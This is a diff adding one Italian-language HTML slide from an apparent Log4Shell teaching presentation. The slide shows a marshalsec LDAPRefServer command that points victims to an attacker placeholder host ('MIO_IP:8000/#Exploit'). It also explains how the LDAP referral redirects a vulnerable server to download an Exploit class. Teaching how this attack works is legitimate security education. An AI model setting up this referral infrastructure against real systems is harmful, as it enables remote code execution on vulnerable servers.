@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Log4Shell - Preparazione Infrastruttura</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/tomorrow-night-blue.min.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Infra 1: Il "Vigile Urbano" (LDAP Referral)</h1>
+        <div class="subtitle">Il Server LDAP (Marshalsec)</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Azione</div>
+                <div class="card-text">
+                    <p><strong>Tool:</strong> marshalsec (Utility Java).</p>
+                    <p><strong>Comando:</strong></p>
+                    <pre><code class="language-java">java ... marshalsec.jndi.LDAPRefServer "http://MIO_IP:8000/#Exploit"</code></pre>
+                    <p><strong>Porta:</strong> Ascolto su 1389.</p>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">Spiegazione</div>
+                <div class="card-text">
+                    <p><strong>Nota per te:</strong> Qui spesso ci si confonde. Perché serve Marshalsec?</p>
+                    <p>Non possiamo mettere il codice virale direttamente dentro la risposta LDAP (è troppo complesso).</p>
+                    <p>Usiamo un trucco chiamato <strong>LDAP Referral</strong>: Marshalsec funge da "vigile". Quando la vittima arriva, lui alza la paletta e dice: "Non fermarti qui, vai all'indirizzo HTTP 8000, lì troverai quello che cerchi (la classe Exploit)".</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 6;</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <script src="main.js"></script>
+</body>
+</html>
